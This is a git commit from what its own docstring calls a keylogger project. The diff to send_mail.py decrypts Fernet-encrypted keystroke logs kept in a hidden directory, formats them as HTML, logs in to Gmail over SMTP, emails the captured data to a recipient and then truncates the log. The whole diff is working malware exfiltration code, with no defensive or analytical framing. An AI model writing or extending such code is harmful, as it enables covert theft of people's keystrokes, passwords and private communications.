36ea154b8f1595528d9c9ecd68493d5ebea3b696
Trọng Đại Nguyễn <brfox2k6@gmail.com>
2023-01-01 00:10:02 +0700

    Add encryption
    Add encryption

--- send_mail.py
+++ send_mail.py
@@ -6,32 +6,42 @@ from constants import *
 from utils import get_time
 from os.path import join
 from playsound import playsound
+from pickle import load
 
 
 def send_mail() -> None:
     """
     Send keylogger data through Gmail.
     """
-    log_f = open(join(HIDE_DIR, LOG_FILE), "r+", encoding="utf-8")
-
     try:
+        log_f = open(join(HIDE_DIR, LOG_FILE), mode="rb+")
+
+        # Get fernet key
+        with open("key.pkl", mode="rb") as key_file:
+            fernet = load(key_file)
+
+        # Read beyond end of the log file
+        try:
+            body = ""
+            while True:
+                # Decrypt the log file
+                body += fernet.decrypt(load(log_f)).decode()
+
+        except EOFError:
+            # New line character in HTML is the `<br>` tag,
+            # space character in HTML is `&nbsp;`
+            body = body.replace("\n", "<br>").replace(" ", "&nbsp;")
+
+            # Change font size and font face
+            # by embedding it into a HTML template
+            body = f'<font size="{FONT_SZ}" face="{FONT_FACE}">{body}</font>'
+
         # Initialize and login gmail server
         server = SMTP(host="smtp.gmail.com", port=587)
         server.ehlo()
         server.starttls(context=create_default_context())
         server.ehlo()
         server.login(user=SENDER, password=SMTP_PASSWORD)
-
-        # Get data from log file
-        body = log_f.read().strip()
-        
-        # New line in HTML
-        body = body.replace("\n", "<br>")
-        # Avoid losing spaces
-        body = body.replace(" ", "&nbsp;")
-
-        # Change font size and font face
-        body = f'<font size="{FONT_SZ}" face="{FONT_FACE}">{body}</font>'
 
         # Initialize message
         message = MIMEMultipart()
@@ -40,11 +50,12 @@ def send_mail() -> None:
         message["To"] = RECIPIENT
         message.attach(MIMEText(body, "html", "utf-8"))
 
-        # Send message
+        # Send message and log out
         server.send_message(message)
         server.quit()
 
-        # After sending the mail successfully, delete all data in the log file
+        # After sending the mail successfully,
+        # delete all data in the log file and close it
         log_f.truncate(0)
         log_f.close()
 
